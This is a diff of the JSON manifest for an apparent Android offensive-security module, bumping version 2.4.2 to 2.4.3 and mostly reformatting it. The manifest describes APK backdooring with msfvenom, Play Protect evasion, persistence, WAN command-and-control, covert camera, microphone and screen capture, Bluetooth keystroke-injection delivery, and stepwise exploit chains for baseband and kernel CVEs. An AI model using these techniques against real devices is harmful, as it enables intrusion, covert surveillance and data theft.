@@ -1,8 +1,8 @@
 {
   "name": "android_pentest",
-  "version": "2.4.2",
+  "version": "2.4.3",
   "category": "mobile",
-  "description": "Complete Android penetration testing suite — recon, static/dynamic analysis, exploitation, payload generation, instrumentation, boot persistence, WAN C2, live screen/camera/mic/speaker capture",
+  "description": "Complete Android penetration testing suite - recon, static/dynamic analysis, exploitation, payload generation, instrumentation, boot persistence, WAN C2, live screen/camera/mic/speaker capture",
   "author": "SecVulnHub Team | 0xb0rn3",
   "executable": "python3 android_pentest.py",
   "dependencies": [
@@ -69,45 +69,45 @@
         ],
         "default": "recon",
         "examples": [
-          "recon              \u2014 Device fingerprint: root/bootloader/SELinux/patch-level/encryption",
-          "app_scan           \u2014 Static APK analysis: manifest, permissions, secrets, weak crypto, score",
-          "vuln_scan          \u2014 Device + app CVE assessment with NVD lookup",
-          "exploit            \u2014 Intent injection, SQLi on content providers, component abuse",
-          "network            \u2014 tcpdump capture + logcat credential leakage + proxy intercept",
-          "forensics          \u2014 DB/SharedPreferences extraction, logcat, SMS, ADB backup",
-          "full               \u2014 Runs recon \u2192 app_scan \u2192 vuln_scan \u2192 exploit \u2192 network \u2192 forensics",
-          "adb_wifi           \u2014 Enable ADB over TCP/WiFi (adb tcpip 5555)",
-          "get_root           \u2014 Multi-vector root: Magisk/su, adb root, CVE-2024-0044, mtk-su, KernelSU",
-          "exploit_cve        \u2014 Targeted CVE check/exploit: CVE-2024-0044, CVE-2024-31317, CVE-2023-45866, CVE-2023-40088, CVE-2023-24033, CVE-2023-26072, CVE-2024-43093, CVE-2025-27363, CVE-2023-0266, CVE-2024-53104, CVE-2023-21492, CVE-2024-20017",
-          "cve_chain          \u2014 Chain multiple CVEs: bt_to_root | sandbox_exfil | zero_click_full | exynos_baseband_rce | wifi_zero_click | freetype_browser | kernel_lpe_chain | bt_zero_click_exfil",
-          "zero_click         \u2014 Zero-interaction vectors: NFC record injection, BLE, WiFi",
-          "backdoor_apk       \u2014 Pull APK, inject msfvenom payload (-x template), sign, reinstall",
-          "deploy_shell       \u2014 Generate fresh msfvenom APK and install via adb",
-          "rebuild            \u2014 BootBuddy: boot persistence APK with WAN MSF C2 via bore tunnels",
-          "wan_expose         \u2014 Expose MSF + APK delivery via Cloudflare Tunnel, generate QR",
-          "qr_exploit         \u2014 QR payload: APK URL / Intent URI / ADB wireless pairing / deeplink",
-          "msf_handler        \u2014 Start Metasploit multi/handler with auto-generated RC file",
-          "frida_hook         \u2014 Deploy frida-server, SSL unpin, root bypass, dump creds, trace",
-          "objection_patch    \u2014 Embed Frida gadget via Objection (no root at runtime)",
-          "process_inject     \u2014 Inject payload into running process via /proc/mem or ptrace",
-          "lsposed_hook       \u2014 Generate + deploy LSPosed module hook (requires LSPosed)",
-          "persist            \u2014 Boot Receiver persistence without root (BOOT_COMPLETED)",
-          "inject_agent       \u2014 Push ARM64/shell agent, receive JSON recon + interactive C2",
-          "c2_gui             \u2014 Launch C2 web dashboard: sessions, bore, MSF, QR, agent callbacks",
-          "c2_cli             \u2014 Headless C2 server (no browser)",
-          "hook               \u2014 secV hook layer: monitor calls + C2 relay",
-          "unhook             \u2014 Remove secV hooks cleanly",
-          "bypass_play_protect\u2014 Repackage APK to evade Play Protect: rename, scrub, junk class, resign",
-          "customize_apk      \u2014 Patch icon (6 densities), label, applicationId of any APK",
-          "screen_mirror      \u2014 Live screen: ADB H.264/ffmpeg (15fps) or MSF screenshot polling",
-          "camera_snap        \u2014 Single camera frame via ADB intent screencap or MSF webcam_snap",
-          "camera_stream      \u2014 Live camera: ADB screencap loop (no payload) or MSF webcam_stream",
-          "mic_record         \u2014 Record mic: ADB tinycap chunks or MSF record_mic",
-          "speaker_push       \u2014 Push audio file to device and play; stop playback remotely",
-          "device_net_scan    \u2014 Scan device WiFi subnet via netrecon",
-          "full_pwn           \u2014 Auto-chain: recon\u2192adb_wifi\u2192get_root\u2192device_net_scan\u2192deploy_shell\u2192persist\u2192wan_expose",
-          "multi_device       \u2014 Run any sub-operation on ALL connected devices simultaneously",
-          "shell              \u2014 Reverse shell handler with auto-delivery via ADB"
+          "recon              — Device fingerprint: root/bootloader/SELinux/patch-level/encryption",
+          "app_scan           — Static APK analysis: manifest, permissions, secrets, weak crypto, score",
+          "vuln_scan          — Device + app CVE assessment with NVD lookup",
+          "exploit            — Intent injection, SQLi on content providers, component abuse",
+          "network            — tcpdump capture + logcat credential leakage + proxy intercept",
+          "forensics          — DB/SharedPreferences extraction, logcat, SMS, ADB backup",
+          "full               — Runs recon → app_scan → vuln_scan → exploit → network → forensics",
+          "adb_wifi           — Enable ADB over TCP/WiFi (adb tcpip 5555)",
+          "get_root           — Multi-vector root: Magisk/su, adb root, CVE-2024-0044, mtk-su, KernelSU",
+          "exploit_cve        — Targeted CVE check/exploit: CVE-2024-0044, CVE-2024-31317, CVE-2023-45866, CVE-2023-40088, CVE-2023-24033, CVE-2023-26072, CVE-2024-43093, CVE-2025-27363, CVE-2023-0266, CVE-2024-53104, CVE-2023-21492, CVE-2024-20017",
+          "cve_chain          — Chain multiple CVEs: bt_to_root | sandbox_exfil | zero_click_full | exynos_baseband_rce | wifi_zero_click | freetype_browser | kernel_lpe_chain | bt_zero_click_exfil",
+          "zero_click         — Zero-interaction vectors: NFC record injection, BLE, WiFi",
+          "backdoor_apk       — Pull APK, inject msfvenom payload (-x template), sign, reinstall",
+          "deploy_shell       — Generate fresh msfvenom APK and install via adb",
+          "rebuild            — BootBuddy: boot persistence APK with WAN MSF C2 via bore tunnels",
+          "wan_expose         — Expose MSF + APK delivery via Cloudflare Tunnel, generate QR",
+          "qr_exploit         — QR payload: APK URL / Intent URI / ADB wireless pairing / deeplink",
+          "msf_handler        — Start Metasploit multi/handler with auto-generated RC file",
+          "frida_hook         — Deploy frida-server, SSL unpin, root bypass, dump creds, trace",
+          "objection_patch    — Embed Frida gadget via Objection (no root at runtime)",
+          "process_inject     — Inject payload into running process via /proc/mem or ptrace",
+          "lsposed_hook       — Generate + deploy LSPosed module hook (requires LSPosed)",
+          "persist            — Boot Receiver persistence without root (BOOT_COMPLETED)",
+          "inject_agent       — Push ARM64/shell agent, receive JSON recon + interactive C2",
+          "c2_gui             — Launch C2 web dashboard: sessions, bore, MSF, QR, agent callbacks",
+          "c2_cli             — Headless C2 server (no browser)",
+          "hook               — secV hook layer: monitor calls + C2 relay",
+          "unhook             — Remove secV hooks cleanly",
+          "bypass_play_protect— Repackage APK to evade Play Protect: rename, scrub, junk class, resign",
+          "customize_apk      — Patch icon (6 densities), label, applicationId of any APK",
+          "screen_mirror      — Live screen: ADB H.264/ffmpeg (15fps) or MSF screenshot polling",
+          "camera_snap        — Single camera frame via ADB intent screencap or MSF webcam_snap",
+          "camera_stream      — Live camera: ADB screencap loop (no payload) or MSF webcam_stream",
+          "mic_record         — Record mic: ADB tinycap chunks or MSF record_mic",
+          "speaker_push       — Push audio file to device and play; stop playback remotely",
+          "device_net_scan    — Scan device WiFi subnet via netrecon",
+          "full_pwn           — Auto-chain: recon→adb_wifi→get_root→device_net_scan→deploy_shell→persist→wan_expose",
+          "multi_device       — Run any sub-operation on ALL connected devices simultaneously",
+          "shell              — Reverse shell handler with auto-delivery via ADB"
         ]
       },
       "device": {
@@ -386,7 +386,7 @@
         "default": 8888
       },
       "mirror": {
-        "description": "Enable screen mirroring (legacy flag — use operation=screen_mirror)",
+        "description": "Enable screen mirroring (legacy flag - use operation=screen_mirror)",
         "type": "boolean",
         "required": false,
         "default": false
@@ -402,7 +402,10 @@
         "type": "string",
         "required": false,
         "default": "adb",
-        "options": ["adb", "msf"]
+        "options": [
+          "adb",
+          "msf"
+        ]
       },
       "cam_id": {
         "description": "Camera index for camera_snap and camera_stream (0=back, 1=front)",
@@ -423,10 +426,10 @@
         "default": 8880
       },
       "duration": {
-        "description": "Recording duration in seconds for mic_record",
+        "description": "Headless listen seconds",
         "type": "integer",
         "required": false,
-        "default": 5
+        "default": 60
       },
       "audio_path": {
         "description": "Local audio file path for speaker_push",
@@ -505,12 +508,6 @@
         "type": "boolean",
         "required": false,
         "default": true
-      },
-      "duration": {
-        "description": "Headless listen seconds",
-        "type": "integer",
-        "required": false,
-        "default": 60
       },
       "payload_type": {
         "description": "Payload type: bash_tcp, python3, all (auto-delivered via ADB if device connected)",
@@ -636,13 +633,37 @@
           "set lhost 10.10.10.10",
           "run <serial>"
         ]
+      },
+      {
+        "description": "[v2.4.3] Persistent global params across modules",
+        "commands": [
+          "setg lhost 192.168.1.100",
+          "setg lport 4444",
+          "use android_pentest",
+          "set operation backdoor_apk",
+          "set package com.target.app",
+          "run device",
+          "back",
+          "use netrecon",
+          "run 192.168.1.0/24"
+        ]
+      },
+      {
+        "description": "[v2.4.3] Reuse last target with bare run",
+        "commands": [
+          "use android_pentest",
+          "set operation recon",
+          "run device",
+          "set operation app_scan",
+          "run"
+        ]
       }
     ],
     "features": [
       "Device fingerprinting and reconnaissance (model, OS, SDK, arch, root, bootloader, SELinux, encryption, patch level)",
       "Multi-vector root acquisition (Magisk, adb root, CVE-2024-0044, mtk-su, KernelSU)",
-      "Targeted CVE exploitation — 12 handlers: framework LPE, Bluetooth, Exynos baseband, WiFi, kernel UAF/OOB, DocumentsUI, FreeType browser",
-      "CVE applicability check with optional show_patched mode — include all CVEs with patch_status field for full coverage view",
+      "Targeted CVE exploitation - 12 handlers: framework LPE, Bluetooth, Exynos baseband, WiFi, kernel UAF/OOB, DocumentsUI, FreeType browser",
+      "CVE applicability check with optional show_patched mode - include all CVEs with patch_status field for full coverage view",
       "8 predefined CVE chains: bt_to_root, sandbox_exfil, zero_click_full, exynos_baseband_rce, wifi_zero_click, freetype_browser, kernel_lpe_chain, bt_zero_click_exfil",
       "Static APK analysis with AAPT/APKTool and jadx (--deep-analysis)",
       "AndroidManifest.xml full security audit",
@@ -814,22 +835,22 @@
       "exploit_cve": {
         "description": "Targeted CVE exploitation check. Reads device patch level, SDK, chipset and manufacturer via ADB to determine exploitability, then runs the appropriate exploit handler. Set show_patched=true to include already-patched CVEs in output.",
         "params": {
-          "cve": "CVE identifier — required (e.g. CVE-2024-0044)",
-          "show_patched": "true/false — include patched CVEs in output (default: false)"
+          "cve": "CVE identifier - required (e.g. CVE-2024-0044)",
+          "show_patched": "true/false - include patched CVEs in output (default: false)"
         },
         "available_cves": {
-          "CVE-2024-0044":   "Android Framework run-as sandbox bypass — cross-app data exfil (API 28-34)",
-          "CVE-2024-31317":  "Android Zygote command injection — system-level code execution (API 28-34)",
-          "CVE-2023-45866":  "Bluetooth HID keystroke injection — no pairing required (BT range)",
-          "CVE-2023-40088":  "Bluetooth UAF zero-click RCE — l2c_rcv_acl_data (BT range)",
-          "CVE-2023-24033":  "Exynos baseband RCE — SDP format string, internet zero-click (Exynos only)",
-          "CVE-2023-26072":  "Exynos SIP heap overflow — VoLTE/WiFi Calling (Exynos only)",
-          "CVE-2024-43093":  "DocumentsUI path traversal — cross-app file read (ITW, API 29-35)",
-          "CVE-2025-27363":  "FreeType OOB write — browser/WebView RCE via malicious page (ITW, all API)",
-          "CVE-2023-0266":   "Linux kernel ALSA UAF LPE — root on kernel 4.4-5.10",
-          "CVE-2024-53104":  "Linux kernel UVC OOB LPE — root via USB/UVC (ITW, all API)",
-          "CVE-2023-21492":  "Samsung KASLR pointer leak — defeat ASLR for kernel exploit chaining (Samsung only)",
-          "CVE-2024-20017":  "Samsung Exynos WLAN OOB — zero-click WiFi kernel RCE (Samsung Exynos only)"
+          "CVE-2024-0044": "Android Framework run-as sandbox bypass - cross-app data exfil (API 28-34)",
+          "CVE-2024-31317": "Android Zygote command injection - system-level code execution (API 28-34)",
+          "CVE-2023-45866": "Bluetooth HID keystroke injection - no pairing required (BT range)",
+          "CVE-2023-40088": "Bluetooth UAF zero-click RCE - l2c_rcv_acl_data (BT range)",
+          "CVE-2023-24033": "Exynos baseband RCE - SDP format string, internet zero-click (Exynos only)",
+          "CVE-2023-26072": "Exynos SIP heap overflow - VoLTE/WiFi Calling (Exynos only)",
+          "CVE-2024-43093": "DocumentsUI path traversal - cross-app file read (ITW, API 29-35)",
+          "CVE-2025-27363": "FreeType OOB write - browser/WebView RCE via malicious page (ITW, all API)",
+          "CVE-2023-0266": "Linux kernel ALSA UAF LPE - root on kernel 4.4-5.10",
+          "CVE-2024-53104": "Linux kernel UVC OOB LPE - root via USB/UVC (ITW, all API)",
+          "CVE-2023-21492": "Samsung KASLR pointer leak - defeat ASLR for kernel exploit chaining (Samsung only)",
+          "CVE-2024-20017": "Samsung Exynos WLAN OOB - zero-click WiFi kernel RCE (Samsung Exynos only)"
         },
         "output": "CVE finding with status (potentially_exploitable/patched/not_exploitable), patch_status, technique, tool references"
       },
@@ -839,16 +860,16 @@
           "chain": "Built-in chain name OR comma-separated CVE IDs",
           "lhost": "C2 callback host for persistence stage (optional)",
           "lport": "C2 callback port (default: 4444)",
-          "show_patched": "true/false — include patched CVEs in chain step output"
+          "show_patched": "true/false - include patched CVEs in chain step output"
         },
         "built_in_chains": {
-          "bt_to_root":          "BT HID keystroke injection (CVE-2023-45866) → Zygote LPE (CVE-2024-31317)",
-          "sandbox_exfil":       "run-as bypass (CVE-2024-0044) → Zygote root (CVE-2024-31317) → data dump",
-          "zero_click_full":     "BT zero-click (CVE-2023-45866) → root (CVE-2024-31317) → exfil (CVE-2024-0044)",
+          "bt_to_root": "BT HID keystroke injection (CVE-2023-45866) → Zygote LPE (CVE-2024-31317)",
+          "sandbox_exfil": "run-as bypass (CVE-2024-0044) → Zygote root (CVE-2024-31317) → data dump",
+          "zero_click_full": "BT zero-click (CVE-2023-45866) → root (CVE-2024-31317) → exfil (CVE-2024-0044)",
           "exynos_baseband_rce": "Exynos baseband (CVE-2023-24033) → SIP overflow (CVE-2023-26072) → Zygote system",
-          "wifi_zero_click":     "Exynos WiFi OOB (CVE-2024-20017) → KASLR (CVE-2023-21492) → ALSA LPE (CVE-2023-0266)",
-          "freetype_browser":    "FreeType browser RCE (CVE-2025-27363) → exfil (CVE-2024-43093) → Zygote persist",
-          "kernel_lpe_chain":    "KASLR defeat (CVE-2023-21492) → ALSA LPE (CVE-2023-0266) / UVC LPE (CVE-2024-53104)",
+          "wifi_zero_click": "Exynos WiFi OOB (CVE-2024-20017) → KASLR (CVE-2023-21492) → ALSA LPE (CVE-2023-0266)",
+          "freetype_browser": "FreeType browser RCE (CVE-2025-27363) → exfil (CVE-2024-43093) → Zygote persist",
+          "kernel_lpe_chain": "KASLR defeat (CVE-2023-21492) → ALSA LPE (CVE-2023-0266) / UVC LPE (CVE-2024-53104)",
           "bt_zero_click_exfil": "BT UAF zero-click (CVE-2023-40088) → run-as exfil (CVE-2024-0044) → DocsUI exfil (CVE-2024-43093)"
         },
         "output": "Chain result with per-step status, access_level achieved, auto_persist result"
@@ -857,34 +878,34 @@
         "description": "Zero-click APK delivery chain: generate/locate backdoored APK → serve over HTTP → expose via bore WAN tunnel → inject download URL onto target via Bluetooth HID keyboard (CVE-2023-45866, no pairing required) → start MSF handler. Also emits the WAN URL for manual/out-of-band delivery (Phase 4a fallback).",
         "requires": "Bluetooth adapter on host (bluez/hcitool), target BT enabled, target patch < 2023-12-01",
         "params": {
-          "bt_addr":     "Target Bluetooth MAC (XX:XX:XX:XX:XX:XX). Omit to skip HID injection and emit URL only.",
-          "apk_path":    "Path to APK to deliver. If absent, generates fresh standalone msfvenom APK.",
-          "payload":     "msfvenom payload (default: android/meterpreter/reverse_tcp)",
-          "lhost":       "Attacker C2 IP (auto-detected from default route)",
-          "lport":       "Attacker listener port (default: 4444)",
-          "serve_port":  "Local HTTP port for APK server (default: 8890)",
+          "bt_addr": "Target Bluetooth MAC (XX:XX:XX:XX:XX:XX). Omit to skip HID injection and emit URL only.",
+          "apk_path": "Path to APK to deliver. If absent, generates fresh standalone msfvenom APK.",
+          "payload": "msfvenom payload (default: android/meterpreter/reverse_tcp)",
+          "lhost": "Attacker C2 IP (auto-detected from default route)",
+          "lport": "Attacker listener port (default: 4444)",
+          "serve_port": "Local HTTP port for APK server (default: 8890)",
           "bore_server": "Bore relay hostname (default: bore.pub)",
-          "key_delay":   "Seconds between HID keystrokes (default: 0.08)",
-          "open_method": "browser (default) — HID HOME+type URL+ENTER | adb — am start VIEW intent"
+          "key_delay": "Seconds between HID keystrokes (default: 0.08)",
+          "open_method": "browser (default) - HID HOME+type URL+ENTER | adb - am start VIEW intent"
         },
         "output": {
-          "category":    "bt_zero_deliver",
-          "status":      "injected | url_only | adb_intent_sent | connection_failed",
-          "wan_url":     "Full APK download URL (bore WAN or LAN fallback)",
-          "apk_path":    "Path to the APK being served",
-          "handler_rc":  "Path to msfconsole handler RC file",
-          "bt_addr":     "Target BT MAC used for injection",
-          "hid_note":    "Human-readable description of what was injected",
-          "lhost":       "C2 callback IP",
-          "lport":       "C2 callback port"
+          "category": "bt_zero_deliver",
+          "status": "injected | url_only | adb_intent_sent | connection_failed",
+          "wan_url": "Full APK download URL (bore WAN or LAN fallback)",
+          "apk_path": "Path to the APK being served",
+          "handler_rc": "Path to msfconsole handler RC file",
+          "bt_addr": "Target BT MAC used for injection",
+          "hid_note": "Human-readable description of what was injected",
+          "lhost": "C2 callback IP",
+          "lport": "C2 callback port"
         },
         "exploit_chain": {
           "step1": "APK generation (msfvenom android/meterpreter/reverse_tcp) or use supplied apk_path",
           "step2": "HTTP APK server (_start_apk_server) + bore WAN tunnel (_start_bore_tunnel)",
           "step3": "MSF multi/handler RC written to work_dir",
-          "step4_bt": "L2CAP HID connect to PSM 0x11 (ctrl) + PSM 0x13 (intr) — no pairing (CVE-2023-45866)",
+          "step4_bt": "L2CAP HID connect to PSM 0x11 (ctrl) + PSM 0x13 (intr) - no pairing (CVE-2023-45866)",
           "step5_bt": "HOME key → 600ms wait → type wan_url char-by-char → ENTER → Android browser opens URL",
-          "fallback":  "If bt_addr omitted or BT unavailable: url_only status — share wan_url manually"
+          "fallback": "If bt_addr omitted or BT unavailable: url_only status - share wan_url manually"
         }
       }
     },
@@ -988,9 +1009,9 @@
     },
     "installation_tiers": {
       "basic": "Device recon and basic app analysis (stdlib + adb)",
-      "standard": "Static APK analysis \u2014 add aapt, keytool (included with JDK)",
-      "full": "Code analysis \u2014 add apktool, jadx",
-      "runtime": "Frida instrumentation \u2014 pip3 install frida-tools objection"
+      "standard": "Static APK analysis — add aapt, keytool (included with JDK)",
+      "full": "Code analysis — add apktool, jadx",
+      "runtime": "Frida instrumentation — pip3 install frida-tools objection"
     },
     "requirements": {
       "basic": [
@@ -1014,58 +1035,83 @@
       ]
     },
     "notes": [
-      "\u26a0\ufe0f  AUTHORIZATION REQUIRED - Only test devices you own or have permission to test",
-      "\u26a0\ufe0f  Some operations require root access (network capture, forensics)",
-      "\u26a0\ufe0f  Exploitation testing is non-destructive and ethical only",
-      "\u26a0\ufe0f  Respect privacy laws and data protection regulations",
-      "\u26a0\ufe0f  Follow responsible disclosure practices",
-      "\ud83d\udca1 Start with 'recon' operation to understand device security posture",
-      "\ud83d\udca1 Use 'app_scan' for comprehensive application security analysis",
-      "\ud83d\udca1 'vuln_scan' provides prioritized vulnerability assessment",
-      "\ud83d\udca1 'exploit' operation tests for real-world exploitability",
-      "\ud83d\udca1 'network' operation requires root for packet capture",
-      "\ud83d\udca1 'forensics' extracts maximum data with root access",
-      "\ud83d\udca1 'full' operation combines all testing methods",
-      "\ud83d\udca1 Connect device via USB or ADB over network",
-      "\ud83d\udca1 Enable USB debugging in Developer Options",
-      "\ud83d\udca1 Accept ADB authorization prompt on device",
-      "\ud83d\udca1 Results saved to temporary directory with full details",
-      "\ud83d\udca1 Combine with other SecV modules for complete assessment"
+      "⚠️  AUTHORIZATION REQUIRED - Only test devices you own or have permission to test",
+      "⚠️  Some operations require root access (network capture, forensics)",
+      "⚠️  Exploitation testing is non-destructive and ethical only",
+      "⚠️  Respect privacy laws and data protection regulations",
+      "⚠️  Follow responsible disclosure practices",
+      "💡 Start with 'recon' operation to understand device security posture",
+      "💡 Use 'app_scan' for comprehensive application security analysis",
+      "💡 'vuln_scan' provides prioritized vulnerability assessment",
+      "💡 'exploit' operation tests for real-world exploitability",
+      "💡 'network' operation requires root for packet capture",
+      "💡 'forensics' extracts maximum data with root access",
+      "💡 'full' operation combines all testing methods",
+      "💡 Connect device via USB or ADB over network",
+      "💡 Enable USB debugging in Developer Options",
+      "💡 Accept ADB authorization prompt on device",
+      "💡 Results saved to temporary directory with full details",
+      "💡 Combine with other SecV modules for complete assessment",
+      "💡 [v2.4.3] setg lhost <ip> - sets lhost globally so it persists across all modules and back/use switches",
+      "💡 [v2.4.3] run with no target argument reuses the last target automatically",
+      "💡 [v2.4.3] options - shortcut for show options, modules - shortcut for show modules",
+      "💡 [v2.4.3] Tab after set shows all parameter names for the loaded module",
+      "💡 [v2.4.3] Fish-style shell: predicted next command shown above prompt, Ctrl+F to accept"
     ],
     "legal_disclaimer": "This tool is designed exclusively for authorized security testing and research. Users must obtain explicit written permission before testing any Android devices or applications they do not own. Unauthorized access to mobile devices may violate computer fraud and abuse laws in your jurisdiction. The authors and contributors assume no liability for misuse. Always follow ethical hacking guidelines and responsible disclosure practices.",
-
     "cve_database": {
       "description": "Active CVEs applicable to Android devices in 2024-2026. Mapped to secV operations. Applicability determined during recon by comparing device security_patch date and API level.",
       "applicability_logic": "By default (show_patched=false): A CVE applies if device security_patch < cve.patch_date AND api_level in cve.affected_api AND vendor filter matches. With show_patched=true: all CVEs matching sdk + vendor constraints are returned, each annotated with patch_status='vulnerable' or 'patched'. Use the CVE tab in the GUI to run checks interactively with the toggle.",
-
       "exynos_baseband": [
         {
           "cve": "CVE-2023-24033",
           "severity": "CRITICAL",
           "cvss": 9.8,
           "patch_date": "2023-03-01",
-          "affected_api": [28, 29, 30, 31, 32, 33],
-          "affected_chips": ["Exynos 850", "Exynos 980", "Exynos 1080", "Exynos 1280", "Exynos 2200", "Exynos Modem 5123", "Exynos Modem 5300", "Exynos 7904"],
-          "title": "Exynos Baseband RCE — internet to baseband, no user interaction",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33
+          ],
+          "affected_chips": [
+            "Exynos 850",
+            "Exynos 980",
+            "Exynos 1080",
+            "Exynos 1280",
+            "Exynos 2200",
+            "Exynos Modem 5123",
+            "Exynos Modem 5300",
+            "Exynos 7904"
+          ],
+          "title": "Exynos Baseband RCE - internet to baseband, no user interaction",
           "description": "Google Project Zero. Improper format string validation in Samsung Exynos baseband firmware. Attacker can achieve RCE at baseband level over mobile data or WiFi Calling with no user interaction. 18 related 0-days disclosed simultaneously.",
           "attack_vector": "NETWORK",
-          "prerequisites": "None — remote, unauthenticated",
+          "prerequisites": "None - remote, unauthenticated",
           "secv_op": "exploit",
           "secv_check": "recon → check chipset + patch_date < 2023-03-01",
-          "references": ["https://googleprojectzero.blogspot.com/2023/03/multiple-internet-to-baseband-remote-rce.html"],
+          "references": [
+            "https://googleprojectzero.blogspot.com/2023/03/multiple-internet-to-baseband-remote-rce.html"
+          ],
           "exploit": {
-            "technique": "Baseband RCE via malformed SDP/SIP — Internet-to-Baseband with no user interaction",
+            "technique": "Baseband RCE via malformed SDP/SIP - Internet-to-Baseband with no user interaction",
             "steps": [
               "1. Confirm target has Exynos chipset and active mobile data or WiFi Calling via recon",
               "2. Craft malicious SIP INVITE with format string payload in SDP 'c=' or 'o=' field targeting Shannon modem parser",
-              "3. Deliver over mobile Internet (attacker calls target number) or WiFi Calling — no authentication required",
-              "4. Format string write corrupts modem stack — achieve arbitrary write in baseband (ring -3)",
+              "3. Deliver over mobile Internet (attacker calls target number) or WiFi Calling - no authentication required",
+              "4. Format string write corrupts modem stack - achieve arbitrary write in baseband (ring -3)",
               "5. From baseband: inject shellcode into AP via shared memory IPC channel (MIPI/CP_SHARED_MEM)",
               "6. Chain with kernel LPE for full userspace root"
             ],
-            "tools": ["scapy (SIP/SDP craft)", "python3 (format string payload gen)", "Project Zero PoC (private — no public release)"],
+            "tools": [
+              "scapy (SIP/SDP craft)",
+              "python3 (format string payload gen)",
+              "Project Zero PoC (private - no public release)"
+            ],
             "secv_function": "_exploit_cve_2023_24033",
-            "outcome": "Baseband RCE → AP kernel code execution — zero user interaction, works over mobile internet from anywhere",
+            "outcome": "Baseband RCE → AP kernel code execution - zero user interaction, works over mobile internet from anywhere",
             "constraints": "Target requires active mobile data OR WiFi Calling enabled; Exynos chipset required (Shannon modem)"
           }
         },
@@ -1074,25 +1120,40 @@
           "severity": "CRITICAL",
           "cvss": 9.8,
           "patch_date": "2023-03-01",
-          "affected_api": [28, 29, 30, 31, 32, 33],
-          "affected_chips": ["Exynos 7904", "Exynos 850", "Exynos 1080", "Exynos 2200"],
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33
+          ],
+          "affected_chips": [
+            "Exynos 7904",
+            "Exynos 850",
+            "Exynos 1080",
+            "Exynos 2200"
+          ],
           "title": "Exynos Baseband SIP Stack Heap Buffer Overflow",
           "description": "Heap buffer overflow in SIP packet parsing in Exynos baseband. Part of the Project Zero batch. Enables RCE over VoLTE/WiFi Calling.",
           "attack_vector": "NETWORK",
-          "prerequisites": "None — remote",
+          "prerequisites": "None - remote",
           "secv_op": "exploit",
           "secv_check": "recon → check chipset Exynos + patch_date < 2023-03-01",
           "exploit": {
-            "technique": "Heap buffer overflow in SIP 'm=' line parser — VoLTE/WiFi Calling delivery",
+            "technique": "Heap buffer overflow in SIP 'm=' line parser - VoLTE/WiFi Calling delivery",
             "steps": [
               "1. Confirm Exynos chipset and VoLTE or WiFi Calling active via recon",
-              "2. Craft SIP INVITE with oversized 'm=' (media description) field in SDP body — exceeds Shannon heap allocation",
+              "2. Craft SIP INVITE with oversized 'm=' (media description) field in SDP body - exceeds Shannon heap allocation",
               "3. Overflow corrupts adjacent heap chunk metadata in baseband heap allocator",
               "4. Chain with heap spray using repeated malformed SIP re-INVITE to control freed region",
-              "5. Overwrite function pointer in SIP session object — redirect execution to shellcode",
+              "5. Overwrite function pointer in SIP session object - redirect execution to shellcode",
               "6. Pivot to AP kernel via shared memory IPC"
             ],
-            "tools": ["scapy (SIP/SDP)", "python3 (heap spray payload)"],
+            "tools": [
+              "scapy (SIP/SDP)",
+              "python3 (heap spray payload)"
+            ],
             "secv_function": "_exploit_cve_2023_26072",
             "outcome": "Baseband heap corruption → code execution via VoLTE/WiFi Calling",
             "constraints": "VoLTE or WiFi Calling must be enabled; Exynos chipset required; no user interaction"
@@ -1103,7 +1164,10 @@
           "severity": "CRITICAL",
           "cvss": 9.8,
           "patch_date": "2023-03-01",
-          "affected_chips": ["Exynos 7904", "Exynos Modem 5123"],
+          "affected_chips": [
+            "Exynos 7904",
+            "Exynos Modem 5123"
+          ],
           "title": "Exynos Baseband NAS Stack OOB Write",
           "description": "Out-of-bounds write in NAS (Non-Access Stratum) message handling in Exynos baseband.",
           "attack_vector": "NETWORK",
@@ -1114,10 +1178,14 @@
               "1. Deploy rogue LTE base station (srsRAN + USRP B210 / LimeSDR)",
               "2. Force target to camp on rogue BS via stronger signal (IMSI catcher mode)",
               "3. Send crafted LTE NAS Attach Request with oversized IMSI/TMSI container field",
-              "4. Shannon NAS handler writes beyond allocated buffer — OOB write in modem stack",
-              "5. Overwrite adjacent modem task control block — hijack modem thread execution"
+              "4. Shannon NAS handler writes beyond allocated buffer - OOB write in modem stack",
+              "5. Overwrite adjacent modem task control block - hijack modem thread execution"
             ],
-            "tools": ["srsRAN (LTE stack)", "USRP B210 / LimeSDR (SDR hardware)", "python3 (NAS packet craft)"],
+            "tools": [
+              "srsRAN (LTE stack)",
+              "USRP B210 / LimeSDR (SDR hardware)",
+              "python3 (NAS packet craft)"
+            ],
             "secv_function": "_exploit_cve_2023_26073",
             "outcome": "OOB write in NAS stack → arbitrary code execution in Exynos modem",
             "constraints": "Requires rogue LTE base station hardware; target must camp on attacker BS; Exynos modem required"
@@ -1128,7 +1196,10 @@
           "severity": "HIGH",
           "cvss": 8.1,
           "patch_date": "2023-03-01",
-          "affected_chips": ["Exynos 7904", "Exynos 850"],
+          "affected_chips": [
+            "Exynos 7904",
+            "Exynos 850"
+          ],
           "title": "Exynos Baseband Memory Corruption in IMS",
           "description": "Memory corruption in IMS (IP Multimedia Subsystem) handler in Exynos modem firmware.",
           "attack_vector": "ADJACENT_NETWORK",
@@ -1138,34 +1209,45 @@
             "steps": [
               "1. Connect to same IMS/VoLTE network as target or deploy rogue IMS server",
               "2. Send crafted SIP REGISTER with oversized P-Asserted-Identity or Contact header",
-              "3. IMS handler performs unchecked memcpy — corruption of adjacent IMS session buffer",
+              "3. IMS handler performs unchecked memcpy - corruption of adjacent IMS session buffer",
               "4. Use-after-free condition created on deregistration sequence",
               "5. Spray IMS session pool to reclaim freed object with controlled content"
             ],
-            "tools": ["scapy", "srsRAN (IMS mode)", "Wireshark (protocol analysis)"],
+            "tools": [
+              "scapy",
+              "srsRAN (IMS mode)",
+              "Wireshark (protocol analysis)"
+            ],
             "secv_function": "_exploit_cve_2023_26076",
             "outcome": "IMS handler memory corruption → code execution in Exynos baseband",
             "constraints": "Adjacent IMS/VoLTE network required; Exynos 7904 or Exynos 850 modem; patch < 2023-03-01"
           }
         }
       ],
-
       "android_framework": [
         {
           "cve": "CVE-2024-0044",
           "severity": "HIGH",
           "cvss": 8.8,
           "patch_date": "2024-03-01",
-          "affected_api": [28, 29, 30, 31, 32, 33, 34],
-          "title": "Android Framework — createPackageContextAsUser Privilege Escalation",
+          "affected_api": [
+            28,
+            29,
+            30,
+            31,
+            32,
+            33,
+            34
+          ],
+          "title": "Android Framework - createPackageContextAsUser Privilege Escalation",
